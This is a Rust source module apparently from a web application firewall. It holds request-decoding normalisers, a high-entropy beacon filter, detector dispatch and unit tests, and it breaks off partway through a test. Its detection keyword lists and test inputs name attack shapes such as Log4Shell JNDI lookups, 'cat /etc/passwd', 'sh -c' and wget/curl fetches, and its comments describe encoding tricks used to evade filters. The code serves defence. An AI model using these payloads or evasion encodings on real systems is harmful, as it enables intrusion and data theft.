pub mod behavior_signals;
pub mod body_abuse;
pub mod brute_force;
pub mod canary;
pub mod command_injection;
pub mod cookie_injection;
pub mod egress_leak;
pub mod enumeration;
pub mod header_injection;
pub mod jwt_inspection;
pub mod mask;
pub mod nosql_injection;
pub mod open_redirect;
pub mod path_traversal;
pub mod recon;
pub mod scores;
pub mod sqli;
pub mod ssrf;
pub mod template_injection;
pub mod velocity_sequence;
pub mod xss;

// AI-T4 — ML-based detector.  Compiled in only when the `ai`
// feature is enabled (pulls the ONNX Runtime binary).  Without
// the feature the module is absent; `cfg.ai.enabled = true` on
// such a build fails boot loudly so the misconfiguration is
// visible.
#[cfg(feature = "ai")]
pub mod ai;

pub use mask::{
    tier_index, tier_str, DetectorClass, DetectorMask, DetectorMaskBody, MaskState,
    SharedDetectorMask, ALL_TIERS,
};

use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

/// A signal emitted by a detector.
#[derive(Clone, Debug)]
pub struct Signal {
    pub score: u32,
    pub tag: String,
    pub field: String,
}

/// Narrow HTML-entity decoder for XSS pattern normalization.
///
/// 2026-05-09 (Run-6 GAP-012) — handles the entities that XSS
/// payloads use to bypass naive substring filters:
///
/// - Numeric: `&#NN;` (decimal), `&#xHH;` (hex)
/// - Named: `&lt;`, `&gt;`, `&quot;`, `&apos;`, `&amp;`, `&#0;`,
///   `&sol;` (`/`), `&colon;` (`:`)
///
/// **NOT a full HTML5 entity decoder** — only the chars XSS
/// payloads use to encode `<`, `>`, `"`, `'`, `&`, `/`, `:`. A
/// full entity table (3 000+ entries) is overkill — XSS bypasses
/// the parser, and the parser only does the canonical-relevant
/// entities for tags + delimiters.
///
/// **Cheap pre-filter:** bail before allocating if no `&` is
/// present. Most production traffic never contains `&` outside
/// of legitimate query separators (which still pass through this
/// helper unchanged because the entity has to be `&NAME;` or
/// `&#NN;` shape).
///
/// **Trailing semicolon optional** for hash-prefixed forms
/// (`&#60`, `&#x3c`) because some HTML parsers accept the
/// trailing-semicolon-less form, which means an attacker can
/// send the same shape and an entity-honoring backend will still
/// decode it.
pub(crate) fn html_entity_decode(input: &str) -> String {
    if !input.contains('&') {
        return input.to_string();
    }
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'&' {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        // Numeric entity: `&#NN;` (decimal) or `&#xHH;` (hex).
        if i + 2 < bytes.len() && bytes[i + 1] == b'#' {
            let (radix, value_start) = if bytes[i + 2] == b'x' || bytes[i + 2] == b'X' {
                (16u32, i + 3)
            } else {
                (10u32, i + 2)
            };
            let mut j = value_start;
            // Bound the digit run to a small max to avoid
            // pathological inputs; 8 digits is enough for all
            // valid Unicode code points.
            while j < bytes.len() && j - value_start < 8 {
                let ok = if radix == 10 {
                    bytes[j].is_ascii_digit()
                } else {
                    bytes[j].is_ascii_hexdigit()
                };
                if !ok {
                    break;
                }
                j += 1;
            }
            if j > value_start {
                let digits = std::str::from_utf8(&bytes[value_start..j]).unwrap_or("");
                if let Ok(code) = u32::from_str_radix(digits, radix) {
                    if let Some(ch) = char::from_u32(code) {
                        let mut buf = [0u8; 4];
                        out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                        // Consume the optional trailing `;`.
                        i = if j < bytes.len() && bytes[j] == b';' {
                            j + 1
                        } else {
                            j
                        };
                        continue;
                    }
                }
            }
            // Malformed numeric entity → emit `&` and advance.
            out.push(b'&');
            i += 1;
            continue;
        }
        // Named entity: `&NAME;` — small allowlist.
        if i + 3 < bytes.len() {
            // Find the next `;` within a short window (8 chars
            // covers every entity in our allowlist).
            let max_end = (i + 1 + 8).min(bytes.len());
            let mut sc = i + 1;
            while sc < max_end && bytes[sc] != b';' {
                sc += 1;
            }
            if sc < bytes.len() && bytes[sc] == b';' {
                let name = &bytes[i + 1..sc];
                let replacement: Option<&[u8]> = match name {
                    b"lt" => Some(b"<"),
                    b"gt" => Some(b">"),
                    b"quot" => Some(b"\""),
                    b"apos" => Some(b"'"),
                    b"amp" => Some(b"&"),
                    b"sol" => Some(b"/"),
                    b"colon" => Some(b":"),
                    // 2026-05-18 S1 — path-traversal evasion entities.
                    // `&period;`/`&dot;` → `.`, `&bsol;` → `\`, `&num;` → `#`
                    // round out the URL-path characters attackers use to
                    // bypass naive substring filters. The XSS subset
                    // above is unchanged; this only extends coverage.
                    b"period" | b"dot" => Some(b"."),
                    b"bsol" => Some(b"\\"),
                    b"num" => Some(b"#"),
                    b"comma" => Some(b","),
                    // 2026-05-18 S1 — shell-metachar entities for
                    // command-injection evasion (e.g. `&semi;&dollar;(id)`).
                    b"semi" => Some(b";"),
                    b"dollar" => Some(b"$"),
                    b"lpar" => Some(b"("),
                    b"rpar" => Some(b")"),
                    b"verbar" | b"vert" => Some(b"|"),
                    b"grave" => Some(b"`"),
                    _ => None,
                };
                if let Some(r) = replacement {
                    out.extend_from_slice(r);
                    i = sc + 1;
                    continue;
                }
            }
        }
        // Bare `&` not followed by a recognised entity — pass through.
        out.push(b'&');
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Simple URL decode: `+` → space, `%XX` → byte.
pub(crate) fn url_decode(input: &str) -> String {
    let mut out = Vec::with_capacity(input.len());
    let bytes = input.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'+' {
            out.push(b' ');
            i += 1;
        } else if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(byte) = u8::from_str_radix(
                std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap_or(""),
                16,
            ) {
                out.push(byte);
                i += 3;
            } else {
                out.push(bytes[i]);
                i += 1;
            }
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Repeated URL-decode — applies [`url_decode`] up to `max_passes`
/// times, stopping as soon as a pass produces no change.
///
/// 2026-05-18 S1 — handles double-encoded payloads like
/// `%252fetc%252fpasswd` (decodes to `%2fetc%2fpasswd`, then to
/// `/etc/passwd`). The single-pass variant only catches the first
/// layer; chained encoding has been a documented WAF bypass for
/// years (RFC 3986 doesn't forbid it; many app frameworks decode
/// it transparently).
///
/// Bounded at 3 passes — three layers of `%25...%25...` is already
/// excessive; further passes invite quadratic-allocation pathology
/// on adversarial input.
pub(crate) fn url_decode_repeated(input: &str, max_passes: usize) -> String {
    let mut current = input.to_string();
    for _ in 0..max_passes {
        let next = url_decode(&current);
        if next == current {
            return current;
        }
        current = next;
    }
    current
}

/// Decode JavaScript / JSON-style escape sequences:
///   - `\uHHHH` (4-hex-digit BMP code point)
///   - `\xHH` (2-hex-digit byte)
///
/// 2026-05-18 S1 — closes the path-traversal evasion class where
/// payloads use `../etc/passwd` or `\x2e\x2e/etc/passwd`
/// (the JSON / JS source-form of `..`). Frameworks that parse JSON
/// bodies decode these transparently; the WAF needs to see the
/// decoded form too.
///
/// Cheap pre-filter: bail before allocating if no `\` is present.
/// Malformed escapes pass through unchanged (the backslash is
/// emitted and parsing resumes at the next char).
pub(crate) fn unicode_escape_decode(input: &str) -> String {
    if !input.contains('\\') {
        return input.to_string();
    }
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'\\' || i + 1 >= bytes.len() {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        match bytes[i + 1] {
            // `\uHHHH` — 4 hex digits → Unicode code point.
            b'u' if i + 5 < bytes.len() => {
                let digits = &bytes[i + 2..i + 6];
                if digits.iter().all(|b| b.is_ascii_hexdigit()) {
                    let s = std::str::from_utf8(digits).unwrap_or("");
                    if let Ok(code) = u32::from_str_radix(s, 16) {
                        if let Some(ch) = char::from_u32(code) {
                            let mut buf = [0u8; 4];
                            out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                            i += 6;
                            continue;
                        }
                    }
                }
                out.push(b'\\');
                i += 1;
            }
            // `\xHH` — 2 hex digits → single byte.
            b'x' if i + 3 < bytes.len() => {
                let digits = &bytes[i + 2..i + 4];
                if digits.iter().all(|b| b.is_ascii_hexdigit()) {
                    let s = std::str::from_utf8(digits).unwrap_or("");
                    if let Ok(byte) = u8::from_str_radix(s, 16) {
                        out.push(byte);
                        i += 4;
                        continue;
                    }
                }
                out.push(b'\\');
                i += 1;
            }
            _ => {
                out.push(b'\\');
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Produce the set of normalised forms a detector should match
/// against. Returns up to 4 variants — the raw input plus each
/// distinct decoder output. Identical results are deduplicated so
/// downstream pattern scans don't run more than once on the same
/// string.
///
/// 2026-05-18 S1 — central pipeline used by path-traversal / sqli /
/// command-injection detectors so the evasion-class coverage is
/// uniform. XSS uses a narrower bespoke pipeline (URL → entity)
/// already; widening it to call `normalize_for_detection` is a
/// follow-up if the eval shows it needs the unicode-escape pass.
///
/// Order matters for short-circuiting: variants are emitted in
/// increasing transform cost, so callers that find a match early
/// can return without running the later passes.
pub(crate) fn normalize_for_detection(input: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::with_capacity(4);
    let mut push = |s: String| {
        if !out.contains(&s) {
            out.push(s);
        }
    };
    push(input.to_string());
    push(url_decode_repeated(input, 3));
    push(html_entity_decode(input));
    push(unicode_escape_decode(input));
    if let Some(hx) = hex_blob_decode(input) {
        push(hx);
    }
    out
}

/// `0x…` hex-string literal pattern (`0x` / `0X` + hex digits).
static HEX_BLOB_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"0[xX]([0-9a-fA-F]+)").unwrap());

/// Splice decoded `0x…` hex-string literals back into `input` so the
/// content detectors can scan the cleartext. Returns `None` when nothing
/// was decoded (so `normalize_for_detection` doesn't push a duplicate).
///
/// 2026-06-16 (sec-regression §3a) — hex-encoded SQLi
/// (`0x27206f7220313d31` → `' or 1=1`) slipped because the old
/// `0x[0-9a-f]{8,}` sqli rule was removed (GPU-id / hash FPs,
/// `sqli.rs:40`) and no decoder ran. We re-enable detection WITHOUT the
/// FP by gating on the *decoded* bytes: a run is only spliced when every
/// byte is **printable ASCII** (`0x20..=0x7e`). `' or 1=1` qualifies and
/// trips the existing `OR 1=1` rule; a GPU id `0x0000C0DE` /
/// hash `0xdeadbeefcafebabe` decodes to non-printable bytes, is left
/// untouched, and stays clean. Shared by sqli / cmdi / path_traversal,
/// but the printable-ASCII gate keeps the blast radius off binary blobs.
pub(crate) fn hex_blob_decode(input: &str) -> Option<String> {
    if !input.contains("0x") && !input.contains("0X") {
        return None;
    }
    let mut decoded_any = false;
    let result = HEX_BLOB_RE.replace_all(input, |caps: &regex::Captures<'_>| {
        let hex = &caps[1];
        // Need an even number of nibbles (≥ 2 bytes) to form bytes.
        if hex.len() >= 4 && hex.len().is_multiple_of(2) {
            if let Some(decoded) = decode_printable_hex(hex) {
                decoded_any = true;
                return decoded;
            }
        }
        // Leave non-qualifying runs (odd length, binary bytes) as-is.
        caps[0].to_string()
    });
    decoded_any.then(|| result.into_owned())
}

/// Decode an even-length hex string to text, but only when every byte is
/// printable ASCII. Returns `None` otherwise (binary / control bytes) so
/// the caller leaves the original `0x…` literal in place.
fn decode_printable_hex(hex: &str) -> Option<String> {
    let bytes = hex.as_bytes();
    let mut out = String::with_capacity(bytes.len() / 2);
    let mut i = 0;
    while i < bytes.len() {
        let hi = (bytes[i] as char).to_digit(16)?;
        let lo = (bytes[i + 1] as char).to_digit(16)?;
        let byte = ((hi << 4) | lo) as u8;
        if !(0x20..=0x7e).contains(&byte) {
            return None;
        }
        out.push(byte as char);
        i += 2;
    }
    Some(out)
}

/// Whether the request body should be regex-scanned by the content
/// detectors (sqli / command_injection / …).
///
/// 2026-05-24 (FP fix) — only bodies the origin will parse as
/// STRUCTURED TEXT are scanned: JSON (`application/json`, `*+json`),
/// form (`application/x-www-form-urlencoded`), XML (`application/xml`,
/// `*+xml`), and `text/*`. Opaque/binary bodies — Chromium UMA
/// protobuf, `application/octet-stream` beacons, images, multipart
/// file uploads — are high-entropy and coincidentally match injection
/// regexes (a GPU id `0x0000C0DE` → the sqli hex rule; random bytes →
/// cmdi shell-command shapes). Replaying the captured corpora showed
/// ~all sqli/cmdi false positives came from scanning such beacon
/// bodies. A body with a missing or unrecognised content-type is NOT
/// scanned (skip-by-default); injection in those is an app-layer
/// concern (parameterised queries / safe exec).
pub(crate) fn body_is_scannable(headers: &http::HeaderMap) -> bool {
    let Some(ct) = headers
        .get(http::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
    else {
        return false;
    };
    // Drop any `; charset=…` / `; boundary=…` params and normalise case.
    let ct = ct.split(';').next().unwrap_or("").trim().to_ascii_lowercase();
    ct.starts_with("text/")
        || ct == "application/json"
        || ct.ends_with("+json")
        || ct == "application/xml"
        || ct.ends_with("+xml")
        || ct == "application/x-www-form-urlencoded"
}

/// Shannon entropy in bits/char over a string's chars. Empty → 0.
/// Used to discriminate opaque high-entropy sensor beacons (base64-ish,
/// ~5.5–6.0 bits/char) from structured/readable form data (~4.0–4.4).
fn shannon_entropy(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = std::collections::HashMap::<char, u32>::new();
    let mut total = 0u32;
    for c in s.chars() {
        *counts.entry(c).or_insert(0) += 1;
        total += 1;
    }
    let total = total as f32;
    counts
        .values()
        .map(|&n| {
            let p = n as f32 / total;
            -p * p.log2()
        })
        .sum()
}

/// High-specificity injection shapes that MUST stay on the scan path
/// even inside a high-entropy form body (S2 risk mitigation, §5): an
/// attacker who pads a real payload to look opaque is still scanned.
///
/// Deliberately **multi-char, low benign-collision** tokens only.
/// 2026-06-18 (round-2 FP fix): the bare 1–2 char metacharacters
/// `` ` `` / `$(` / `${` / `{{` / `<%` were REMOVED. A real Akamai/F5
/// `sensor_data` beacon is ~5 KB of high-entropy printable ASCII and
/// contains those bytes by chance with probability ≈ 1, so they
/// re-admitted the exact bodies this gate exists to skip — driving the
/// command-injection / sqli benign blocks. Log4Shell's `${jndi…}` is
/// preserved explicitly (`${jndi`), and `/bin/` / `/etc/passwd` /
/// `sh -c` / `cmd /c` / `powershell` / `union`+`select` / `wget` /
/// `curl` / `nslookup` are long enough that random collision in a blob
/// is negligible. A genuine `$(id)` / `` `id` `` / `{{7*7}}` payload
/// *padded into a single-dominant high-entropy form value* is the
/// documented, accepted trade-off — real injection in parseable form
/// data is multi-field / low-entropy and never reaches this gate.
fn has_high_signal_injection_shape(body: &str) -> bool {
    const LITERAL_SHAPES: &[&str] = &["/bin/", "/etc/passwd"];
    if LITERAL_SHAPES.iter().any(|s| body.contains(s)) {
        return true;
    }
    let lower = body.to_ascii_lowercase();
    const CI_SHAPES: &[&str] = &[
        "${jndi", "sh -c", "cmd /c", "powershell", "union", "select", "wget", "curl", "nslookup",
    ];
    CI_SHAPES.iter().any(|s| lower.contains(s))
}

/// True when a `application/x-www-form-urlencoded` (or `text/plain`)
/// body is a bot-management **sensor beacon** rather than parseable
/// injection surface (S2, 2026-06-18, §2a). Akamai `sensor_data=…`,
/// PerimeterX, and F5 sensors POST a single very long, high-entropy
/// value that coincidentally matches shell/SQL/template regexes (esp.
/// after `hex_blob_decode`), producing the cmdi/template/sqli benign
/// blocks. The content scanners skip such bodies.
///
/// Conservative by design — targets the genuine single-dominant-blob
/// shape so a normal multi-field form (even one carrying a long CSRF
/// token) is NOT skipped and stays fully scanned:
///   - content-type form-urlencoded or text/plain, AND
///   - the longest single value is ≥ [`BEACON_MIN_VALUE_LEN`] chars and
///     comprises ≥ 90 % of the body (one dominant blob), AND
///   - that value's Shannon entropy ≥ [`BEACON_MIN_ENTROPY_BITS`], AND
///   - no high-signal injection shape is present (keyword fast-path).
///
/// NB: thresholds are tuned for the documented sensor shape; the
/// precise cutoffs should be re-validated against the captured beacon
/// corpus once the FP harness (§1/S0) attributes per-field hits.
pub(crate) fn form_body_is_opaque_beacon(headers: &http::HeaderMap, body: &str) -> bool {
    const BEACON_MIN_VALUE_LEN: usize = 256;
    const BEACON_MIN_ENTROPY_BITS: f32 = 4.5;
    const BEACON_DOMINANCE: f32 = 0.9;

    let Some(ct) = headers
        .get(http::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
    else {
        return false;
    };
    let ct = ct.split(';').next().unwrap_or("").trim().to_ascii_lowercase();
    if ct != "application/x-www-form-urlencoded" && ct != "text/plain" {
        return false;
    }
    if body.len() < BEACON_MIN_VALUE_LEN {
        return false;
    }
    if has_high_signal_injection_shape(body) {
        return false;
    }
    // Longest single value. For `text/plain` the whole body IS the value —
    // do NOT split on `=` (real sensor beacons are JSON-ish text containing
    // `=`, e.g. base64 padding `…Hi8=;…`; splitting would truncate the
    // candidate value and let the beacon escape the gate). For
    // form-urlencoded, take the longest value among `&`-separated `k=v` pairs.
    let longest = if ct == "text/plain" {
        body
    } else {
        body.split('&')
            .map(|pair| pair.split_once('=').map(|(_, v)| v).unwrap_or(pair))
            .max_by_key(|v| v.len())
            .unwrap_or("")
    };
    longest.len() >= BEACON_MIN_VALUE_LEN
        && (longest.len() as f32) >= BEACON_DOMINANCE * (body.len() as f32)
        && shannon_entropy(longest) >= BEACON_MIN_ENTROPY_BITS
}

/// Detector trait — each OWASP detector implements this.
pub trait Detector: Send + Sync {
    fn id(&self) -> &'static str;
    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal>;
}

/// Collect signals from all detectors. Bypasses the mask — use
/// [`run_all_filtered`] in production paths so disabled classes
/// short-circuit before the detector runs.
pub fn run_all(detectors: &[Box<dyn Detector>], req: &RequestView<'_>) -> Vec<Signal> {
    let mut signals = Vec::new();
    for d in detectors {
        signals.extend(d.inspect(req));
    }
    signals
}

/// Collect signals from every detector whose class is enabled in
/// `mask`. Hot path: the `is_enabled_id` check is one bitfield AND.
pub fn run_all_filtered(
    detectors: &[Box<dyn Detector>],
    mask: DetectorMask,
    req: &RequestView<'_>,
) -> Vec<Signal> {
    let mut signals = Vec::new();
    for d in detectors {
        if !mask.is_enabled_id(d.id()) {
            continue;
        }
        signals.extend(d.inspect(req));
    }
    signals
}

/// PROM-T2 — same loop as [`run_all_filtered`], but additionally
/// reports the stable id of every detector that emitted at least
/// one signal. The proxy uses the `fired` list to increment
/// `waf_detector_hits_total{class}` without parsing free-form
/// tag strings.
///
/// `Signal` itself doesn't carry the source detector — adding it
/// would touch every detector module. Returning the hit list at
/// the loop level keeps the change surgical.
///
/// Hot-path cost: one extra `Vec::push` per firing detector. In
/// the common allow-path no detector fires, so cost reduces to
/// the same single-allocation profile as the unobserved variant.
pub fn run_all_filtered_observed(
    detectors: &[Box<dyn Detector>],
    mask: DetectorMask,
    req: &RequestView<'_>,
) -> (Vec<Signal>, Vec<&'static str>) {
    let mut signals = Vec::new();
    let mut fired: Vec<&'static str> = Vec::new();
    for d in detectors {
        if !mask.is_enabled_id(d.id()) {
            continue;
        }
        let s = d.inspect(req);
        if !s.is_empty() {
            fired.push(d.id());
        }
        signals.extend(s);
    }
    (signals, fired)
}

/// Same as [`run_all_filtered_observed`] but invokes `record(class,
/// elapsed)` once per detector run. Used by the data plane to
/// populate the per-detector latency histogram without a separate
/// pass through the chain. The closure is `&mut dyn FnMut` so the
/// caller can hold its histogram by reference; cost when the
/// closure is a no-op is one branch + one Instant pair per
/// detector.
pub fn run_all_filtered_timed(
    detectors: &[Box<dyn Detector>],
    mask: DetectorMask,
    req: &RequestView<'_>,
    mut record: impl FnMut(&'static str, std::time::Duration),
) -> (Vec<Signal>, Vec<&'static str>) {
    let mut signals = Vec::new();
    let mut fired: Vec<&'static str> = Vec::new();
    // 2026-05-20 — AI/ML short-circuit. The AI classifier is the
    // noisiest, costliest detector (it over-fires on benign traffic
    // and pays ~700µs/inference). A request already caught by a
    // Base-mask signature detector doesn't need the ML verdict, so
    // we DEFER the `ai` detector and only run it when NO Base
    // detector matched. This both avoids AI false positives piling
    // onto an already-decided request and skips the inference cost
    // on the common attack path.
    let mut ai_detector: Option<&Box<dyn Detector>> = None;
    for d in detectors {
        if !mask.is_enabled_id(d.id()) {
            continue;
        }
        if d.id() == "ai" {
            ai_detector = Some(d);
            continue;
        }
        let t0 = std::time::Instant::now();
        let s = d.inspect(req);
        record(d.id(), t0.elapsed());
        if !s.is_empty() {
            fired.push(d.id());
        }
        signals.extend(s);
    }
    // Run AI only when it's enabled in the mask AND no Base detector
    // fired on this request.
    if fired.is_empty() {
        if let Some(d) = ai_detector {
            let t0 = std::time::Instant::now();
            let s = d.inspect(req);
            record(d.id(), t0.elapsed());
            if !s.is_empty() {
                fired.push(d.id());
            }
            signals.extend(s);
        }
    }
    (signals, fired)
}

/// Create the default set of detectors using the default config.
/// Open-redirect runs in strict mode (empty allowlist) — the
/// proxy run path uses [`default_detectors_with`] to pick up
/// `cfg.detectors.open_redirect.allowed_domains`.
pub fn default_detectors() -> Vec<Box<dyn Detector>> {
    default_detectors_with(&aegis_core::config::DetectorsConfig::default())
}

/// Build the default detector set, threading `cfg` so detectors
/// with operator-tunable behaviour (currently only open-redirect's
/// `allowed_domains`) pick up the live config. Toggleable on/off
/// state still flows through the [`SharedDetectorMask`] hot-path
/// gate; this constructor only sets per-detector startup state.
pub fn default_detectors_with(
    cfg: &aegis_core::config::DetectorsConfig,
) -> Vec<Box<dyn Detector>> {
    vec![
        Box::new(sqli::SqliDetector),
        Box::new(xss::XssDetector),
        Box::new(path_traversal::PathTraversalDetector),
        Box::new(ssrf::SsrfDetector),
        Box::new(header_injection::HeaderInjectionDetector),
        Box::new(body_abuse::BodyAbuseDetector::default()),
        Box::new(recon::ReconDetector),
        Box::new(brute_force::BruteForceDetector::default()),
        // 2026-05-08 SEC-M002 — dedicated command-injection class.
        // Pre-fix, cmdi was caught only by AI or via incidental
        // overlap with path_traversal regex. With AI disabled the
        // pipeline missed `$(id)`, `| whoami`, etc. entirely.
        Box::new(command_injection::CommandInjectionDetector),
        // 2026-05-08 Run-5 GAP-006 — dedicated SSTI class. Detects
        // template-engine payloads in URI + body (Jinja2 / Twig /
        // Mako / Freemarker / Velocity / Spring SpEL / Handlebars).
        Box::new(template_injection::TemplateInjectionDetector),
        // 2026-05-08 Run-5 GAP-007 — dedicated NoSQL operator
        // injection class. Detects MongoDB-flavored operator
        // injection in query strings (?param[$ne]=x) and JSON
        // bodies ({"$where":"..."}). Closed operator vocabulary
        // → near-zero FP on legit Postgres $1 placeholders or
        // currency strings.
        Box::new(nosql_injection::NoSqlInjectionDetector),
        // 2026-05-09 Run-5 GAP-009 — open-redirect detector. Flags
        // suspicious external-URL values in known redirect-param
        // names. Empty `allowed_domains` = strict mode; operators
        // with legitimate redirect targets configure
        // `cfg.detectors.open_redirect.allowed_domains` to skip
        // those.
        Box::new(open_redirect::OpenRedirectDetector::new(
            cfg.open_redirect.allowed_domains.clone(),
        )),
        // 2026-06-12 (JWT report, Phase A1) — JWT attack-shape
        // detector. Decodes the token header from `Authorization:
        // Bearer` / `Cookie` and flags malicious structure (alg:none,
        // inline key material, kid traversal/SQLi). Detection-only —
        // no signature verification (that stays in the gateway). Not
        // yet a `DetectorClass`, so it runs unconditionally
        // (`mask.is_enabled_id` returns true for unknown ids); the
        // 2026-06-12 (Phase A2) — now a first-class `DetectorClass`
        // (runtime toggle + per-tier mask + config). The `jku`/`x5u`
        // external-host rule reads the operator allowlist; empty =
        // strict (any external key-set URL flags).
        Box::new(jwt_inspection::JwtInspectionDetector::new(
            cfg.jwt_inspection.jku_allowed_domains.clone(),
            cfg.jwt_inspection.flag_privileged_roles,
        )),
        // 2026-06-12 (WS report P2) — SQLi/NoSQLi in session cookies.
        // Gated by the `CookieInjection` mask bit (default OFF), so it's
        // inert until an operator opts in.
        Box::new(cookie_injection::CookieInjectionDetector),
    ]
}

/// 2026-05-18 F-CRITICAL-012 (security audit, Phase F) — variant
/// of [`default_detectors_with`] that also appends the
/// [`canary::CanaryDetector`], wired to a shared [`canary::CanaryPaths`]
/// handle. Canary is a peer of the OWASP detectors but data-driven
/// from `RiskConfig` rather than `DetectorsConfig`; this entry point
/// keeps the call site in `aegis-proxy::run` to a single line.
///
/// 2026-05-20 — the canary detector is now **always** registered
/// from the shared handle so the path set is editable live via
/// `PUT /api/risk/canary-paths` and the `Canary` mask bit can be
/// flipped on at runtime, both with no chain rebuild. Execution is
/// gated by the `Canary` mask bit (seeded from `cfg.canary.enabled`),
/// so a disabled or empty canary costs one `ArcSwap` load that the
/// dispatcher skips entirely when the bit is off.
pub fn default_detectors_with_canary(
    cfg: &aegis_core::config::DetectorsConfig,
    canary_paths: &canary::CanaryPaths,
    // AC-P2-b (2026-07-04) — when the boot path wants a handle to the
    // chain's brute-force instance (fleet-backend install + count_scope
    // hot-reload), it builds the `Arc` itself and passes it here; the
    // shared handle replaces the default chain slot. `None` keeps the
    // self-contained instance (tests / simulator).
    brute_force: Option<std::sync::Arc<brute_force::BruteForceDetector>>,
) -> Vec<Box<dyn Detector>> {
    let mut v = default_detectors_with(cfg);
    if let Some(shared) = brute_force {
        if let Some(slot) = v.iter_mut().find(|d| d.id() == "brute_force") {
            *slot = Box::new(shared);
        }
    }
    // Always register canary from the shared handle; the `Canary`
    // mask bit gates whether the dispatcher actually runs it, and
    // the path set is hot-swappable via the admin control plane.
    v.push(Box::new(canary::CanaryDetector::from_handle(
        canary_paths.clone(),
    )));
    if cfg.behavior_signals.enabled {
        // 2026-05-18 F-CRITICAL-004 (security audit, Phase F) — the
        // four §5.2 behaviour signals (burst / no-UA /
        // missing-Referer on mutations / zero-depth first-touch).
        // Stateful per-IP; default OFF as of 2026-05-19 because the
        // 50 ms burst threshold trips on single-IP smoke tests.
        // AC-P2-e (2026-07-03) — thread the opt-in Referer-origin config
        // (default-OFF); only active when this detector is enabled.
        v.push(Box::new(
            behavior_signals::BehaviorSignalsDetector::with_referer_origin(
                100_000,
                cfg.referer_origin.clone(),
            ),
        ));
    }
    if cfg.velocity.enabled {
        // 2026-05-18 F-CRITICAL-003 (security audit, Phase F) — the
        // velocity sequence engine. Default ON; zero cost when the
        // upstream has no /login, /otp, /deposit, /withdrawal routes.
        v.push(Box::new(
            velocity_sequence::VelocitySequenceDetector::new(),
        ));
    }
    // AC-P2-d (2026-07-04) — the enumeration detector is NOT chain-resident:
    // its 404-rate half needs the upstream status, which only the AC-P3-b
    // response-outcome hook sees. It lives on `ProxyContext.enumeration`
    // (mirroring `behavior_analyzer`), constructed only when
    // `cfg.enumeration.enabled`.
    v
}

#[cfg(test)]
#[allow(deprecated)]  // test scaffolding uses NoopPipeline
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn make_req(path: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::GET,
            path.parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        )
    }

    fn view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m,
            uri: u,
            version: http::Version::HTTP_11,
            headers: h,
            peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None,
            body: b,
        }
    }

    // ---- S2 (2026-06-18) form-body opaque-beacon gate ----

    /// 320-char uniform base64url string → entropy ≈ 6.0 bits/char,
    /// well above the beacon threshold; contains no injection shape.
    fn high_entropy_blob() -> String {
        let cs: Vec<char> =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
                .chars()
                .collect();
        (0..320).map(|i| cs[i % cs.len()]).collect()
    }

    fn headers_ct(ct: &str) -> http::HeaderMap {
        let mut h = http::HeaderMap::new();
        h.insert(http::header::CONTENT_TYPE, ct.parse().unwrap());
        h
    }

    #[test]
    fn beacon_single_form_value_is_opaque() {
        let body = format!("sensor_data={}", high_entropy_blob());
        let h = headers_ct("application/x-www-form-urlencoded");
        assert!(form_body_is_opaque_beacon(&h, &body));
    }

    #[test]
    fn beacon_text_plain_blob_is_opaque() {
        let body = high_entropy_blob();
        let h = headers_ct("text/plain; charset=utf-8");
        assert!(form_body_is_opaque_beacon(&h, &body));
    }

    #[test]
    fn beacon_short_form_is_not_opaque() {
        let h = headers_ct("application/x-www-form-urlencoded");
        assert!(!form_body_is_opaque_beacon(&h, "role=admin&page=2"));
    }

    #[test]
    fn beacon_json_content_type_never_opaque() {
        // Only form-urlencoded / text-plain are gated here; JSON keeps
        // its own structured-text handling.
        let body = format!("{{\"x\":\"{}\"}}", high_entropy_blob());
        let h = headers_ct("application/json");
        assert!(!form_body_is_opaque_beacon(&h, &body));
    }

    #[test]
    fn beacon_multi_field_form_not_dominated_is_scanned() {
        // Two large fields → no single dominant blob → NOT a beacon, so
        // a real injection in either field still gets scanned.
        let body = format!("a={}&b={}", high_entropy_blob(), high_entropy_blob());
        let h = headers_ct("application/x-www-form-urlencoded");
        assert!(!form_body_is_opaque_beacon(&h, &body));
    }

    #[test]
    fn beacon_with_injection_shape_is_scanned() {
        // Padded-to-look-opaque payloads keep the keyword fast-path — but
        // only for HIGH-SPECIFICITY multi-char shapes that don't collide
        // with random ASCII. Bare `$(` / `` ` `` / `${` / `{{` / `<%` were
        // dropped (2026-06-18 round-2 FP fix): each appears in ~every 5 KB
        // sensor beacon by chance and re-admitted the body this gate exists
        // to skip. See `beacon_with_stray_subshell_metachars_stays_opaque`.
        let h = headers_ct("application/x-www-form-urlencoded");
        for shape in [
            "${jndi:ldap://x/a}",
            "/bin/sh",
            "cat /etc/passwd",
            "sh -c id",
            "UNION SELECT",
            "wget http://x/",
            "curl http://x/",
            "powershell",
        ] {
            let body = format!("d={}{}", high_entropy_blob(), shape);
